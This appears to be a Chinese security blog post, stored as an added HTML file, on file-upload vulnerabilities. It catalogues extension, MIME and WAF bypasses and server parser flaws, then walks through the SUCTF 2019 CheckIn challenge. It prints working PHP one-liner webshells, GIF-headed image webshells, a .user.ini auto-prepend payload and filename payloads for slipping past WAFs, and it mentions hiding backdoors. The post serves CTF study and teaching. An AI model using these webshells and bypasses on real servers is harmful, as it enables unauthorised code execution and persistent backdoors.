@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.80.0 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Zor01478">
+<meta name="keywords" content="文件上传, C/C&#43;&#43;, PHP, Java, 渗透">
+<meta name="description" content="
+Web漏洞-文件上传
+">
+
+
+<meta property="og:description" content="
+Web漏洞-文件上传
+">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta name="twitter:title" content="文件上传">
+<meta property="og:url" content="https://Zor01478.github.io/2021/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+<meta property="twitter:url" content="https://Zor01478.github.io/2021/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+<meta property="og:site_name" content="戴头盔的招财">
+<meta property="og:description" content="
+Web漏洞-文件上传
+">
+<meta name="twitter:description" content="
+Web漏洞-文件上传
+">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2021-02-16T15:31:01">
+  
+  
+    <meta property="article:modified_time" content="2021-02-16T15:31:01">
+  
+  
+  
+    
+      <meta property="article:section" content="招财渗透屋">
+    
+  
+  
+    
+      <meta property="article:tag" content="Web安全">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/suolue2.png">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/suolue2.png">
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+  <meta property="twitter:image" content="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+
+
+    <title>文件上传</title>
+
+    <link rel="icon" href="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+    
+
+    
+
+    <link rel="canonical" href="https://Zor01478.github.io/2021/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://Zor01478.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://Zor01478.github.io/">戴头盔的招财</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://Zor01478.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://Zor01478.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">Zor01478</h4>
+        
+          <h5 class="sidebar-profile-bio">戴了头盔，所以头很铁</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">类别</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Zor01478" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              post-header-cover--full"
+       style="background-image:url('/images/fengmian2.jpg')"
+       data-behavior="5">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      文件上传
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-02-16T15:31:01&#43;08:00">
+        
+  二月 16, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://Zor01478.github.io/categories/%e6%8b%9b%e8%b4%a2%e6%b8%97%e9%80%8f%e5%b1%8b">招财渗透屋</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="5"
+        class="hasCover
+               hasCoverMetaIn
+               hasCoverCaption">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+            <span class="post-header-cover-caption caption">雪国的樱花</span>
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <blockquote>
+<p>Web漏洞-文件上传</p>
+</blockquote>
+<h1 id="目录">目录</h1>
+<!-- raw HTML omitted -->
+<ul>
+<li><a href="#web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">Web漏洞-文件上传</a>
+<ul>
+<li><a href="#%E9%AA%8C%E8%AF%81%E5%92%8C%E7%BB%95%E8%BF%87">验证和绕过</a></li>
+<li><a href="#%E5%90%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E--%E4%BF%AE%E5%A4%8D">各解析漏洞 / 修复</a></li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a></li>
+<li><a href="#%E6%B6%89%E5%8F%8A%E7%BD%91%E7%AB%99">涉及网站</a></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h2 id="web漏洞-文件上传">Web漏洞-文件上传</h2>
+<ul>
+<li>危害: 直接上传Webshell</li>
+</ul>
+<h3 id="验证和绕过">验证和绕过</h3>
+<blockquote>
+<p>前端：JS类防护</p>
+</blockquote>
+<blockquote>
+<p>后端</p>
+</blockquote>
+<ul>
+<li>黑名单
+<ul>
+<li>特殊解析后缀</li>
+<li>.htaccess解析(分布式配置文件)</li>
+<li>大小写绕过</li>
+<li>点绕过</li>
+<li>空格绕过</li>
+<li>::$DATA绕过</li>
+<li>配合解析漏洞</li>
+<li>双后缀名绕过</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>在window的时候如果文件名+&quot;<code>::$DATA</code>&ldquo;会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名。</p>
+</blockquote>
+<blockquote>
+<p>例如:&quot;<code>phpinfo.php::$DATA</code>&rdquo; Windows 会自动去掉末尾的 <code>::$DATA</code> 变成 &ldquo;phpinfo.php&rdquo; 。
+【删除文件名末尾的点；转换为小写；收尾去空格；循环过滤（例如可能会过滤一次php字符，那么写成phpphp就可以绕过了）】</p>
+</blockquote>
+<blockquote>
+<p>在 windows  环境下，xx.jpg[ 空格 ] 或 xx.jpg. 这两类文件都是不允许存在的 , 若这样命名,windows 会默认除去空格或点 , 攻击者可以通过抓包 , 在文件名后加一个空格或者点绕过 黑名单 . 若上传成功 , 空格和点都会被 windows 自动消除 , 这样也可以 getshell。</p>
+</blockquote>
+<blockquote>
+<p>如果在 Apache 中 .htaccess 可被执行 . 且可被上传 . 那可以尝试在 .htaccess 中写入 :<code>SetHandlerapplication/x-httpd-php</code>然后再上传名称为 shell.jpg 的 webshell, 这样 shell.jpg 就可解析为 php 文件。</p>
+</blockquote>
+<ul>
+<li>
+<p>白名单</p>
+<ul>
+<li>MIME绕过</li>
+<li>%00截断 (chr(0)表示的是null)</li>
+<li>0x00截断</li>
+<li>0x0a截断</li>
+<li>php版本在5.3以下</li>
+<li>get方法会自动解码成url；而post不会所以要对%00 进行url编码再添加到xxx.php后面</li>
+</ul>
+</li>
+<li>
+<p>内容及其他</p>
+<ul>
+<li>文件头检测</li>
+<li>二次渲染</li>
+<li>先上传了再验证，temp？类似缩略图，再保存那种。
+<ul>
+<li>条件竞争：占用</li>
+</ul>
+</li>
+<li>突破getimagesize()
+<ul>
+<li>这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的(十六进制：8950 4e47，不同类型的图片头部值会不一样)</li>
+<li>图片一句话制作三种姿势
+<ol>
+<li>cmd： copy 1.png /b + shell.php /a webshell.jpg
+其中 <code>/b 表示二进制</code>，<code>/a 表示ASCII码</code></li>
+<li>直接伪造头部GIF89A</li>
+<li>使用GIMP通过增加备注写入执行命令</li>
+</ol>
+</li>
+<li>可能需要结合文件包含来触发(include  ../)</li>
+</ul>
+</li>
+<li>突破exif_imagetype()</li>
+<li>文件类型绕过(MIME):从请求数据包中Content-Type中获取</li>
+<li>目录命名：xxx.php/.</li>
+<li>脚本函数漏洞：CVE-2015-2348</li>
+<li>数组接受+目录命名（能看到源码的情况下）</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A001.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A002.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A003.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A004.png" alt=""></p>
+<h3 id="各解析漏洞--修复">各解析漏洞 / 修复</h3>
+<blockquote>
+<p>解析漏洞</p>
+</blockquote>
+<ul>
+<li>
+<p>IIS6/7.X     IIS6.0</p>
+<ul>
+<li>文件夹：image/xxx.jpg   &ndash;&gt;  image.asp/pp.jpg     同样会被IIS6.0当作ASP文件来解析并执行。首先请求/image.asp/pp.jpg，服务器会从<code>头部查找查找&quot;.&quot;号</code>,获得<code>.asp/pp.jpg</code>。然后查找<code>&quot;/&quot;</code>,如果有则<code>内存截断</code>，所以image.asp/pp.jpg会当做image.asp进行解析。</li>
+<li>文件：image.jpg   &ndash;&gt;   image.asp;.jpg 或 xxx.asp;xxx.jpg    此文件就会被当做asp执行【IIS6.0及以下<code>分号后面的扩展名不会被解析</code>，其他类型的执行文件也是一样的】</li>
+<li>test.jpg/.php，无论文件是否存在都直接交给 php 处理，而 php 又默认开启<code>&quot;cgi.fig_pathinfo&quot;</code>，在开启时访问 url, 比如 <a href="http://www.xxx.com/test.php/x.php">http://www.xxx.com/test.php/x.php</a>； 其中 x.php 是不存在的 文件，所以 php 将会向前递归解析，若test.php存在就当做php程序执行，于是就造成了解析漏洞 . IIS7.0 、 IIS7.5 、 Nginx 等 Web服务器</li>
+</ul>
+</li>
+<li>
+<p>Apache：配置安全(/etc/mime.types)，解析漏洞（低版本，不识别就会向前解析xxx.php.yyy.z）；换行解析</p>
+</li>
+<li>
+<p>Nginx：(/etc/mime.types); 在图片中嵌入 PHP 代码 , 然后通过访问 <code>xxx.jpg%00.php</code> 就可以执行其中的代码</p>
+</li>
+<li>
+<p>CMS漏洞
+通达OA系统</p>
+</li>
+<li>
+<p>其他漏洞</p>
+<ul>
+<li>编辑器漏洞
+fckeditor
+ewebeditor
+ckeditor
+kindeditor
+<a href="https://navisec.it/">编辑器漏洞手册</a></li>
+</ul>
+</li>
+<li>
+<p>CVE漏洞
+CVE-2015-5254
+CVE-2017-12615
+CVE-2019-2618</p>
+</li>
+<li>
+<p>安全修复</p>
+<ul>
+<li>后端验证</li>
+<li>后缀检测</li>
+<li>MIME检测：基于上传自带类型检测</li>
+<li>内容检测：文件头，完整性检测</li>
+<li>自带 / 自定义过滤函数</li>
+<li>WAF产品</li>
+</ul>
+</li>
+<li>
+<p>WAF绕过</p>
+<ul>
+<li>safedog</li>
+<li>BT</li>
+<li>xxx云盾</li>
+</ul>
+</li>
+<li>
+<p>上传参数名解析</p>
+<ul>
+<li>content-disposition：一般可以更改</li>
+<li>name：表单参数，不能更改</li>
+<li>filename：文件名，可更改</li>
+<li>content-type：文件MIME，视情况更改</li>
+</ul>
+</li>
+</ul>
+<p>数据溢出-防匹配（xxx&hellip;..）
+符号变异-防匹配（'  &quot;  ;）
+数据截断-防匹配（%00  ;  换行）
+重复数据-防匹配（参数多次，冗余）</p>
+<pre><code>#playload 大量垃圾数据缓冲溢出（可修改部分）
+filename=&quot;x.php
+filename='x.php
+filename=&quot;x.jpg;.php&quot;
+filename=&quot;Content-Disposition:from-data;name=&quot;upload_file&quot;;x.php&quot;
+filename=&quot;x.jpg&quot;;filename=&quot;x.jpg&quot;;......filename=&quot;x.php&quot;;
+filenam=&quot;Content-Type:image/jpeg;x.php&quot;
+</code></pre><p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A005.png" alt=""></p>
+<ul>
+<li>
+<p>利用思路</p>
+<ul>
+<li>常规类</li>
+<li>扫描获取上传</li>
+<li>会员中心上传</li>
+<li>后台系统上传</li>
+<li>各种途径上传</li>
+</ul>
+</li>
+<li>
+<p>CMS类：已知CMS源码</p>
+</li>
+<li>
+<p>其他类</p>
+<ul>
+<li>代码审计</li>
+<li>平台/第三方应用</li>
+</ul>
+</li>
+<li>
+<p>配合文件包含漏洞</p>
+</li>
+</ul>
+<h3 id="实践">实践</h3>
+<blockquote>
+<p>[SUCTF 2019]CheckIn</p>
+</blockquote>
+<ul>
+<li>涉及知识点：<code>.user.ini</code> 利用 + <code>exif_imagetype()</code> 绕过的文件上传
+<ol>
+<li>不能上传&lt;?</li>
+<li>上传的文件必须包含图片头</li>
+<li><a href="https://github.com/team-su/SUCTF-2019">题目源码</a></li>
+</ol>
+</li>
+</ul>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A006.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A007.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A008.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A009.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A010_1.png" alt=""></p>
+<ul>
+<li>shell.jpg</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">GIF89a</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;php&#34;</span><span style="color:#f92672">&gt;</span> <span style="color:#960050;background-color:#1e0010">@</span>eval(<span style="color:#a6e22e">$_POST</span>[<span style="color:#e6db74">&#39;shell&#39;</span>]);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+
+<span style="color:#75715e">// 能上传，但是需要解析我们上传的图片马；.htaccess传不上去。这里用到了.user.ini文件。
+</span><span style="color:#75715e"></span><span style="color:#f92672">------------------------------------------------------------------------------</span>
+<span style="color:#a6e22e">or</span>
+<span style="color:#f92672">------------------------------------------------------------------------------</span>
+<span style="color:#a6e22e">GIF89a</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;php&#39;</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;cat /flag&#39;</span>);<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><ul>
+<li>.user.ini</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#a6e22e">GIF89a                       //绕过exif_imagetype()</span>
+<span style="color:#a6e22e">auto_prepend_file</span><span style="color:#f92672">=</span><span style="color:#e6db74">shell.jpg  //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</span>
+<span style="color:#a6e22e">auto_append_file</span><span style="color:#f92672">=</span><span style="color:#e6db74">shell.jpg   //解析后进行包含</span>
+</code></pre></div><p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A011.png" alt=""></p>
+<ul>
+<li>
+<p>用蚁剑连接</p>
+<ul>
+<li>上传文件得到的路径：uploads/852aff287f54bca0ed7757a702913e50</li>
+<li>构造 <a href="http://b4f5ca51-0451-4462-bbf7-821c815e7e60.node3.buuoj.cn/uploads/852aff287f54bca0ed7757a702913e50/index.php">http://b4f5ca51-0451-4462-bbf7-821c815e7e60.node3.buuoj.cn/uploads/852aff287f54bca0ed7757a702913e50/index.php</a></li>
+</ul>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A012.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A013.png" alt=""></p>
+</li>
+</ul>
+<blockquote>
+<p>拓展</p>
+</blockquote>
+<ul>
+<li>.user.ini实战利用的可能性
+<ul>
+<li>服务器脚本语言为<code>PHP</code></li>
+<li>服务器使用<code>CGI／FastCGI</code>模式</li>
+<li><code>上传目录下要有可执行的php文件</code></li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><code>.user.ini</code> 要比 <code>.htaccess</code> 的应用范围要广一些，毕竟.htaccess只能用于Apache</li>
+<li>但“上传目录下要有可执行的php文件”这个要求在文件上传中也比较苛刻</li>
+<li>故可能需要结合其他漏洞，比如: <code>对上传时的路径没有检测../</code>，因此导致文件可被上传至任意目录，就可以利用了</li>
+<li>把.user.ini利用在隐藏后门上是个很好的利用方法，我们在存在php文件的目录下留下.user.ini和我们的图片马，就达到了隐藏后门的目的</li>
+</ol>
+<ul>
+<li>一句话木马详解
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><ul>
+<li><code>@</code> 为了是不报错，即使出错也不会报错</li>
+<li>php里面几个超全局变量：<code>$_GET</code>、<code>$_POST</code>就是其中之一。$_POST[&lsquo;x&rsquo;]; 的意思就是x这个变量，用post的方法接收</li>
+<li>post是在消息体存放数据，get是在消息头的url路径里存放数据（如xxx.php?x=2）</li>
+<li>eval()把字符串作为PHP代码执行</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// 超全局变量
+</span><span style="color:#75715e"></span>$GLOBALS  <span style="color:#75715e">// 在GLOBALS数组中，键名==变量名(即下标)，例如$x = 75, 那么GLOBALS[X]就等于75。
+</span><span style="color:#75715e"></span>$_SERVER  <span style="color:#75715e">// 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。
+</span><span style="color:#75715e"></span>$_REQUEST  <span style="color:#75715e">// 用于收集HTML表单提交的数据(例如：用来收集表单中的 input 字段数据)。
+</span><span style="color:#75715e"></span>$_POST  <span style="color:#75715e">// 被广泛应用于收集表单数据，在HTML form标签的指定该属性：&#34;method=&#34;post&#34;。
+</span><span style="color:#75715e"></span>$_GET  <span style="color:#75715e">// 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：&#34;method=&#34;get&#34;。
+</span><span style="color:#75715e"></span>$_FILES <span style="color:#75715e">// 用于获取上传的文件
+</span><span style="color:#75715e"></span>$_ENV  <span style="color:#75715e">// 存储了一些系统的环境变量，涉及到实际的操作系统。
+</span><span style="color:#75715e"></span>$_COOKIE  <span style="color:#75715e">// 是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用cookie）。    语法：$.cookie(名称, 值, [option])
+</span><span style="color:#75715e"></span>$_SESSION  <span style="color:#75715e">// 会话，其本来的含义是指有始有终的一系列动作/消息
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// https://www.php.net/manual/zh/language.variables.superglobals.php
+</span></code></pre></div><h3 id="涉及网站">涉及网站</h3>
+<ol>
+<li><a href="http://github.com/c0ny1/upload-labs">http://github.com/c0ny1/upload-labs</a>             【文件上传靶场】</li>
+<li><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a>        【fuzz字典库】</li>
+<li><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a>      【fuzz字典库】</li>
+<li><a href="https://www.cnblogs.com/HelloCTF/p/12976796.html">https://www.cnblogs.com/HelloCTF/p/12976796.html</a> 【参考链接】</li>
+</ol>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://Zor01478.github.io/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/rce%E5%9F%BA%E7%A1%80/" data-tooltip="RCE基础">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-tooltip="文件包含">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 Zor01478. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/rce%E5%9F%BA%E7%A1%80/" data-tooltip="RCE基础">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-tooltip="文件包含">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+    
+    <h4 id="about-card-name">Zor01478</h4>
+    
+      <div id="about-card-bio">戴了头盔，所以头很铁</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Sec
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        杭州
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    <div id="cover" style="background-image:url('https://gitee.com/zor01478/blog-picture/raw/master/images/qianyang.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://Zor01478.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+  
+    <script src="https://Zor01478.github.io/js/clicklove.js"></script>
+  
+
+  
+    <script src="https://Zor01478.github.io/js/snow.js"></script>
+  
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
